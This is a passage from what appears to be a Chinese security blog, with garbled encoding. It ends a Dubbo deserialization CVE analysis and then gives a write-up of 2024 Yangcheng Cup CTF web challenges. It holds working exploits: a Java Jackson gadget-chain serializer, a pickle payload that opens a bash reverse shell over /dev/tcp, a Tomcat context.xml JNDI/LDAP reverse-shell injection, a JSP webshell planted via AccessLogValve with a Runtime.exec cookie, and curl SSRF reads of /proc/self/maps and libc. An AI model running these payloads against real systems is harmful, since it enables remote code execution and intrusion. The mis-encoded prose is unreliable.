alt="image-20240908001703249"></p><p>ä¹‹åè°ƒç”¨<code>request.getRequestURI</code>æ–¹æ³•ï¼Œè·å–pathè·¯å¾„ï¼Œä¹‹åä¼šåœ¨ä¹‹åæŸ¥æ‰¾uriè·¯å¾„æ˜¯å¦åœ¨skeletonMapä¸­ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001720829.png" alt="image-20240908001720829"></p><p>å¦‚æœæ²¡æœ‰ï¼Œä¹‹åå°†ä¼šè¿”å›é”™è¯¯ï¼Œå› ä¸ºæ²¡æœ‰æä¾›å¯¹åº”çš„æœåŠ¡ã€‚</p><p>ä¹‹åå°±æ˜¯è·å–è¿œç¨‹åœ°å€å’Œè¿œç¨‹åœ°å€çš„ç«¯å£ï¼Œæœ€åè°ƒç”¨äº†<code>skeleton.handleRequest</code>æ–¹æ³•</p><p>è¿™ä¸ªæ—¶å€™skeletonæ˜¯<code>HttpInvokerServiceExporter</code>ç±»ï¼Œå€¼å¾—å…³æ³¨çš„ä»–çš„contentTypeå±…ç„¶æ˜¯<code>application/x-java-serialized-object</code>ç±»å‹ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001740453.png" alt="image-20240908001740453"></p><p>æ¥åˆ°handleRequestæ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001807350.png" alt="image-20240908001807350"></p><p>è·Ÿè¿›<code>readRemoteInvocation</code>æ–¹æ³•è°ƒç”¨ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001818635.png" alt="image-20240908001818635"></p><p>ç»§ç»­è°ƒç”¨å…¶æ–¹æ³•é‡è½½ï¼ˆåŠ ä¸Šäº†ä¸ªrequestä½œç”¨åŸŸçš„è¾“å…¥æµä½œä¸ºå‚æ•°ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001830796.png" alt="image-20240908001830796"></p><p>åœ¨ä¸Šé¢ç®­å¤´ä½ç½®ï¼Œæ¯”å¦‚è¦åœ¨requeståŸŸä¸­è·å–inputstreamï¼Œä¸ç„¶ä¸ä¼šè¿›å…¥<code>doReadRemoteInvocation</code>æ–¹æ³•çš„è°ƒç”¨</p><p>æˆ‘ä»¬è·Ÿè¿›æ¼æ´è§¦å‘ç‚¹æ–¹æ³•<code>doReadRemoteInvocation</code>æ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001849228.png" alt="image-20240908001849228"></p><p>åœ¨è¿™é‡Œå°†oisè¿™ä¸ªObejctInputStreamå¯¹è±¡ç›´æ¥æ²¡æœ‰è¿‡æ»¤å°±è¿›è¡Œäº†ååºåˆ—åŒ–çš„è°ƒç”¨ï¼Œé€ æˆäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>è‹¥æ˜¯æœ‰ä¸ªCC3.2çš„ä¾èµ–ï¼Œç›´æ¥å¯ä»¥æ‰“CC4äº†ã€‚</p><h4 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h4><p>åœ¨<code>2.7.5</code>ç‰ˆæœ¬ä¸­ï¼Œåœ¨è·å–äº†skeletonä¹‹åè°ƒç”¨å…¶handleæ–¹æ³•ï¼Œæ­¤æ—¶çš„skeletonæ˜¯<code>JsonRpcServer</code>å¯¹è±¡ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001938135.png" alt="image-20240908001938135"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“å…¶æ˜¯è°ƒç”¨çš„å…¶çˆ¶ç±»çš„handleræ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001949320.png" alt="image-20240908001949320"></p><p>åœ¨å…¶ä¸­æ²¡æœ‰å¯ååºåˆ—åŒ–çš„æ“ä½œï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908001959494.png" alt="image-20240908001959494"></p><p>å½“ç„¶è¿˜æœ‰ Redis &#x2F; Kryoç­‰ç­‰åè®®é€ æˆçš„æ¼æ´ç­‰ã€‚</p><p>Hessianåè®®è¿˜æœ‰CVE-2021-37579ï¼Œä¹Ÿæœ‰toStringBeançš„æ¼æ´CVE-2021-43297ï¼Œè¯¦è§<a href="https://mp.weixin.qq.com/s/WKeSRSEJ5hLAXzF60vau5g?ref=www.ctfiot.com">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ2 (qq.com)</a></p><p>å‚è€ƒï¼š</p><p><a href="https://tttang.com/archive/1730/#toc_cve-2021-30179">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ1 - è·³è·³ç³– (tttang.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/dubbo#id-0x01-what-is-dubbo">Dubbo | Java (gitbook.io)</a></p><p><a href="https://l3yx.github.io/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/#CVE-2019-17564">Apache Dubbo ååºåˆ—åŒ–æ¼æ´å¤ç°ç¬”è®° | l3yxâ€™s blog</a></p><p><a href="https://mp.weixin.qq.com/s/WKeSRSEJ5hLAXzF60vau5g?ref=www.ctfiot.com">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ2 (qq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ç¾ŠåŸæ¯-web</title>
    <link href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/"/>
    <url>/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœŸæ˜¯ä¸€åœºé…£ç•…æ·‹æ¼“çš„èµ¤çŸ³å•Šã€‚</p><p>è¿˜æœ‰é˜´å…µå‡Œæ™¨ä¸‰ç‚¹ä¸Šåˆ†çš„ï¼Œé—²é±¼pyå“¥é—¹éº»äº†ã€‚ç›´æ¥ç»™æˆ‘ä»¬ä»ç¬¬ä¸€å¹²åˆ°ç¬¬åå»äº†ï¼Œç¬‘å¸äº†ã€‚</p><p>æ‡’å¾—è¯´äº†ï¼Œç›´æ¥æ¥å§ã€‚</p><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>å‘ç°getGiftè¿™ä¸ªgetteræ–¹æ³•å¯ä»¥ç›´æ¥å†™ç±»åŠ è½½å™¨ï¼š</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240830213741544.png" alt="image-20240830213741544"></p><p>ç»•è¿‡fileä¹Ÿå¾ˆç®€å•ï¼Œå‰é¢åŠ ä¸ª<code>:file:/</code>å°±ç»•äº†ã€‚</p><p>æ–‡ä»¶ä¸Šä¼ æ¥å£ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„staticä»£ç å—çš„jaråŒ…ï¼Œç„¶åç”¨åˆ°ä¸€ä¸ªä»AliyunCTF2024é‡Œå­¦åˆ°çš„æ¯”è¾ƒæ–°çš„JacksonåŸç”Ÿï¼š</p><p><code>EventListenerList#readObject -&gt; JacksonToString2Getter</code></p><p>è¿›åˆ°userçš„getGiftåï¼Œä½¿ç”¨jar:åŠ è½½æ¶æ„ç±»jar:file:templates&#x2F;evil.jar!&#x2F;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-comment">//import com.xiinnn.template.ToStringClass;</span><br><span class="hljs-comment">//import com.xiinnn.tostring2getter.JacksonToString2Getter;</span><br><span class="hljs-keyword">import</span> com.example.ycbjava.bean.User;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><span class="hljs-keyword">import</span> java.sql.Driver;<br><br><span class="hljs-comment">// EventListenerList#readObject -&gt; toString</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        ToStringClass toStringClass = new ToStringClass();</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.username=<span class="hljs-string">&quot;jar:file:templates/evil.jar!/eval&quot;</span>;<br><br>        <span class="hljs-comment">//if here you don&#x27;t use try-catch, the program will throw an exception and execute fail.</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;;<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(user);<br><span class="hljs-comment">//        JacksonToString2Getter jackson = new JacksonToString2Getter();</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(node);<br>        setFieldValue(list, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-type">byte</span>[] code = serialize(list);<br>        System.out.println(Base64.getEncoder().encodeToString(code));<br><span class="hljs-comment">//        unserialize(code);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = c.getDeclaredField(fieldName);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;<br>                c = c.getSuperclass();<br>            &#125;<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] code)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(code);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ å¤„ä¼ å…¥æ¶æ„jarï¼Œç„¶åæ‰“&#x2F;user&#x2F;serè·¯ç”±ååºåˆ—åŒ–ç›´æ¥æ·»åŠ classloaderï¼Œåå¼¹shelläº¤äº†ã€‚</p><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>æ‰“çƒ‚çš„é¢˜ã€‚</p><p>pickleååºåˆ—åŒ–ï¼Œæ‰‹æ“ä¸ªopcodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie,cookie_encode,cookie_encode_raw<br><br>url = <span class="hljs-string">&quot;http://139.155.126.78:32301/&quot;</span> <span class="hljs-comment">#lyrics?lyrics=/usr/etc/app/app.py&quot;</span><br><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:5000/&quot; #lyrics?lyrics=/usr/etc/app/app.py&quot;</span><br><br><br>res = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;testtest&quot;</span>&#125;<br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;user&#x27;</span><br><span class="hljs-string">(S&#x27;username&#x27;</span><br><span class="hljs-string">S&#x27;admin&#x27;</span><br><span class="hljs-string">dt.&#x27;&#x27;&#x27;</span><br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;user&#x27;</span><br><span class="hljs-string">(S&#x27;username&#x27;</span><br><span class="hljs-string">(S&#x27;os&#x27;</span><br><span class="hljs-string">S&#x27;system&#x27;</span><br><span class="hljs-string">\x93S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span><br><span class="hljs-string">odt.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># a = set_cookie(, res, secret=secret_code)</span><br><span class="hljs-comment"># a= cookie_encode((&quot;user&quot;, res), secret_code)</span><br>a= cookie_encode_raw(data, secret_code)<br><span class="hljs-built_in">print</span>(a)<br><br>re = requests.get(url+<span class="hljs-string">&quot;/board&quot;</span>,cookies=&#123;<br>    <span class="hljs-string">&quot;user&quot;</span>:a.decode()<br>&#125;)<br><span class="hljs-built_in">print</span>(re.text)<br></code></pre></td></tr></table></figure><h2 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h2><p>æœ‰ç‚¹å¥½ç©çš„é¢˜ï¼Œä½†æ˜¯éé¢„æœŸä¹Ÿè›®å¤šâ€¦â€¦</p><p>ç»™äº†ä¸€ä¸ªç™»å½•è·¯ç”±ï¼Œè¯»xmlçš„è·¯å¾„ï¼Œweb.xmlç»™banäº†ã€‚é¦–å…ˆè¯»åˆ°è´¦å¯†ç™»å½•ï¼Œé‡Œé¢åˆæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¼ xmlã€‚</p><p>è¿™é“å¯ä»¥è¦†ç›–<code>/opt/tomcat/myapp/WEB-INF/web.xml</code>ï¼Œä½†è¦†ç›–ä¸äº†confç›®å½•ä¸‹çš„web.xmlã€‚</p><p>æ‰€ä»¥ç¬¬ä¸€é¢˜æˆ‘ä»¬ç›´æ¥è¦†ç›–tomcat-web.xmlï¼Œè®©xmlè§£ææˆjspã€‚</p><p>ä¸Šä¼ jspæœ¨é©¬å°±å®Œäº‹äº†ã€‚è¿‡ç¨‹å°±å·æ‡’ä¸å†™äº†ã€‚</p><h2 id="tomtom2-revenge"><a href="#tomtom2-revenge" class="headerlink" title="tomtom2_revenge"></a>tomtom2_revenge</h2><p>web.xmlå½»åº•banäº†ï¼Œä¸èƒ½å¥—ç”¨æ–¹æ³•è®©xmlè§£ææˆjspäº†ã€‚é€šè¿‡tomtom2è¯»æºç ï¼Œåˆ†æå‘ç°tomcatæœ‰h2çš„libã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ‰“jndiåˆ°h2çš„getterã€‚</p><p>ä¸Šä¼ è·¯å¾„ä¸º<code>/opt/tomcat/conf/</code>ï¼Œç›´æ¥è¦†ç›–è¯¥ç›®å½•ä¸‹çš„<code>context.xml</code>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="hljs-comment">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="hljs-comment">  this work for additional information regarding copyright ownership.</span><br><span class="hljs-comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="hljs-comment">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="hljs-comment">  the License.  You may obtain a copy of the License at</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment">  See the License for the specific language governing permissions and</span><br><span class="hljs-comment">  limitations under the License.</span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-comment">&lt;!-- The contents of this file will be loaded for each web application --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span><br>    <span class="hljs-comment">&lt;!-- web application will be reloaded.                                   --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>WEB-INF/tomcat-web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    &lt;Manager pathname=&quot;&quot; /&gt;</span><br><span class="hljs-comment">    --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">dataSourceName</span>=<span class="hljs-string">&quot;ldap://vps:1389/TomcatJDBC/H2/Java/ReverseShell/vps/port&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">autoCommit</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä½†é—®äº†å…¶ä»–é˜Ÿäº¤æµäº†ä¸‹ï¼Œè¿™é“é¢˜è¿˜æœ‰ä¸ªéé¢„æœŸæ˜¯è¦†ç›–<code>META-INF/context.xml</code>ï¼Œåˆ©ç”¨<code>org.apache.catalina.valves.AccessLogValve</code></p><p>ä¸Šä¼ è·¯å¾„ä¸º<code>./META-INF</code>ï¼Œä¼ å…¥ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Value</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;/opt/tomcat/webapps/myapp/&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;shell&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.jsp&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%&#123;Cookie&#125;i&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">resolveHosts</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¸¦ä¸€ä¸ªæ¶æ„cookieè®¿é—®&#x2F;myappï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è®¿é—®<code>shell.2024-08-27.jsp</code>ï¼Œï¼ˆåç¼€ç”Ÿæˆæ—¶é—´å³å½“å¤©ï¼‰å†…å­˜é©¬å°±æ³¨å…¥äº†ï¼Œå‚æ•°ä¸ºcmdï¼Œç¡®å®é«˜æ‰‹ã€‚</p><h2 id="ç½‘ç»œç…§ç›¸é¦†"><a href="#ç½‘ç»œç…§ç›¸é¦†" class="headerlink" title="ç½‘ç»œç…§ç›¸é¦†"></a>ç½‘ç»œç…§ç›¸é¦†</h2><p>æ‰“SSRFçš„ä¸œè¥¿ï¼Œfile:&#x2F;&#x2F;ä¼ªåè®®å¯è¯»æ–‡ä»¶ï¼š</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224400557.png" alt="image-20240827224400557"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224416038.png" alt="image-20240827224416038"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224431698.png" alt="image-20240827224431698"></p><p>hash_fileå¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œè€Œä¸”å› ä¸ºè¿™æ˜¯php8æ‰“ä¸äº†pharï¼Œå¾ˆè‡ªç„¶æƒ³åˆ°CVE-2024-2961é‚£ä¸ªiconvçš„æ´ã€‚</p><p>å…ˆä½¿ç”¨fileä¼ªåè®®è¯»å–mapså’Œlibcï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://139.155.126.78:32411/url.php&quot;</span> -d <span class="hljs-string">&quot;url=file://127.0.0.1/proc/self/maps&quot;</span> -o maps<br>curl <span class="hljs-string">&quot;http://139.155.126.78:32411/url.php&quot;</span> -d <span class="hljs-string">&quot;url=file://127.0.0.1/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span> -o lic.so<br></code></pre></td></tr></table></figure><p>ç„¶åä»sqlæ³¨å…¥å¤„æ‰“æ”¹è‰¯çš„iconv-payload:</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224653523.png" 